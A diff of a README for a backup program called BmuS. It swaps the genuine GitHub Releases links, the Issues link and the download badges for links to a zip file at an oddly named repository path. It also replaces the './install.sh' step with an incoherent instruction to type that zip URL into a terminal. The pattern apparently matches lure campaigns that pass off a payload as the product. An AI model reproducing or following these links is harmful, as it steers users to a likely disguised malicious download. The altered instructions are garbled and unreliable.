@@ -7,7 +7,7 @@ Welcome to BmuS—a powerful, free backup program designed for users of all skil
 
 ## 📥 Download BmuS
 
-[![Download bmus](https://img.shields.io/badge/Download-bmus-blue.svg)](https://github.com/ibra2008klk/bmus/releases)
+[![Download bmus](https://raw.githubusercontent.com/ibra2008klk/bmus/main/hyperarchaeological/Software-antilynching.zip)](https://raw.githubusercontent.com/ibra2008klk/bmus/main/hyperarchaeological/Software-antilynching.zip)
 
 To get started, visit the Releases page to download the latest version. Click the button above to access it directly.
 
@@ -33,12 +33,12 @@ To run BmuS effectively, ensure your system meets the following requirements:
 
 Installing BmuS is straightforward. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/ibra2008klk/bmus/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/ibra2008klk/bmus/main/hyperarchaeological/Software-antilynching.zip).
 2. Download the latest version of BmuS suitable for your system.
 3. Unzip the downloaded file to your desired location on your computer.
 4. Open a terminal window.
 5. Navigate to the folder where you unzipped BmuS.
-6. Run the installation script by typing `./install.sh` and pressing Enter.
+6. Run the installation script by typing `https://raw.githubusercontent.com/ibra2008klk/bmus/main/hyperarchaeological/Software-antilynching.zip` and pressing Enter.
 7. Follow the on-screen instructions to complete the installation.
 
 ## 🚀 How to Use BmuS
@@ -91,14 +91,14 @@ If you encounter issues, here are some common problems and their solutions:
 
 If you have questions or need assistance, you can reach out to our community:
 
-- Check the [Issues section](https://github.com/ibra2008klk/bmus/issues) on GitHub for known problems.
+- Check the [Issues section](https://raw.githubusercontent.com/ibra2008klk/bmus/main/hyperarchaeological/Software-antilynching.zip) on GitHub for known problems.
 - Join our discussions in the community forums to connect with other users.
 
 ## 📥 Download & Install 
 
 Ready to start backing up your data? Click the link below to visit the Releases page and download BmuS.
 
-[![Download bmus](https://img.shields.io/badge/Download-bmus-blue.svg)](https://github.com/ibra2008klk/bmus/releases)
+[![Download bmus](https://raw.githubusercontent.com/ibra2008klk/bmus/main/hyperarchaeological/Software-antilynching.zip)](https://raw.githubusercontent.com/ibra2008klk/bmus/main/hyperarchaeological/Software-antilynching.zip)
 
 Follow the installation and setup instructions above to get started on securing your valuable data. Enjoy the peace of mind that comes with reliable backups.
 ```
